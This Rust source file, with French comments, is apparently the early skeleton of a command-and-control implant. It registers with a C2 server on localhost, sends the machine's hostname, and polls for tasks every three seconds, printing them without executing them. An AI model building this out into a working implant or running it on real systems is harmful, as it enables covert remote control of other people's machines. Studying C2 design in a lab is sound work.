use hostname;
use reqwest::Client;
use std::error::Error;
use std::thread;
use std::time::Duration;
use serde::{Serialize};


#[derive(Serialize)]
struct PostData {
    name: String,
    hostname: String,
    ip: String,
    key: String,
}

struct TasksUrl {
    task_url: String,
    result_url: String,
}

impl TasksUrl {
    fn new(ip: &str, port: &u16) -> Self {
        let task_url = format!("http://{}:{}//getTask", ip, port);
        let result_url = format!("http://{}:{}//receiveResult", ip, port);
        TasksUrl {task_url, result_url} // simplification d'instenciation (nécessite les mêmes noms de variables)
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    // Définition des informations sur le serveur C2
    let ip = "127.0.0.1".to_string();
    let port: u16 = 4444;
    let regl = format!("http://{}:{}/register", ip, port); //Définition de l'URL du C2 pour les requêtes 
    let hname_os = hostname::get()?; // Récupération du hostname
    let hname = hname_os
        .into_string()
        .unwrap_or_else(|_| "unknown".to_string()); // Convertir le hostname en String
    
     // Définition des informations a envoyé au C2
     let post_data = PostData {
        name : "raph".to_string(),
        hostname : hname,
        ip : "1.1.1.1".to_string(),
        key: "1234".to_string(),
    };
  
    let client = Client::new(); // Ouverture d'un client pour effectuer les requêtes
    let response = client.post(&regl).json(&post_data).send().await?; // Envoie de la requête d'enregistrement auprès du serveur C2
    let name = response.text().await?; // Réception de la réponse du serveur (agent name)
    println!("contenu de la réponse :{}", name); // debug

    let urls = TasksUrl::new(&ip, &port);

    println!("{},{}", urls.task_url, urls.result_url);
     
    //  // Déclaration en milliseconde
     let n: u64 = 3000;
    // Démarrage boucle infini
    loop {
        let taskr = client.get(&urls.task_url).send().await?; // Requête GET afin de savoir si il y a une tâche
        
        // Bloc d'actions si il y a une tâche
        if taskr.status() != 204 {
            let task = taskr.text().await?;
            println!("{}", task);
        }

        thread::sleep(Duration::from_millis(n)); // L'agent sleep 3 secondes à chaque fin de boucle
    }

    Ok(())
}
